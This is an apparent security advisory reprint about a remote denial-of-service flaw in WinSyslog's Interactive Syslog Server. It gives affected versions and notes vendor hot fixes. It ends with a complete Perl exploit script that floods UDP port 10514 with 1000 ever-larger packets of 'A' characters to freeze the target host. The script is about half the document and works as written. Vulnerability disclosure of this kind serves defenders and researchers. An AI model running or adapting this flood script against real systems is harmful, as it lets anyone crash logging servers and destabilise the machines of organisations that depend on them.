source: http://www.securityfocus.com/bid/8821/info

WinSyslog is prone to a remotely exploitable denial of service vulnerability. The issue exists in the Interactive Syslog Server specifically. This occurs when the program receives multiple excessive syslog messages via the port it listens on (10514/UDP by default). This is also reported to cause system instability, which is likely due to resource exhaustion.

The issue does not affect the WinSyslog or MonitorWare agent services. This issue affects versions of WinSyslog prior to 2003-09-15. The vendor has released hot fixes for the MonitorWare Agent product, which also includes the vulnerable component. 

#!/usr/bin/perl
#WinSyslog System Freeze Vulnerability

use IO::Socket;
$host = "192.168.1.44";
$port = "10514";
$data = "A";

$socket = IO::Socket::INET->new(Proto => "udp") or die "Socket error:
$@\n";
$ipaddr = inet_aton($host) || $host;
$portaddr = sockaddr_in($port, $ipaddr);

for ($count = 0; $count < 1000; $count ++)
{
$buf = "";
$buf .= "A"x((600+$count)*4);

print "Length: ", length($buf), "\n";
send($socket, $buf, 0, $portaddr);
print "sent\n";
}

print "Done\n";
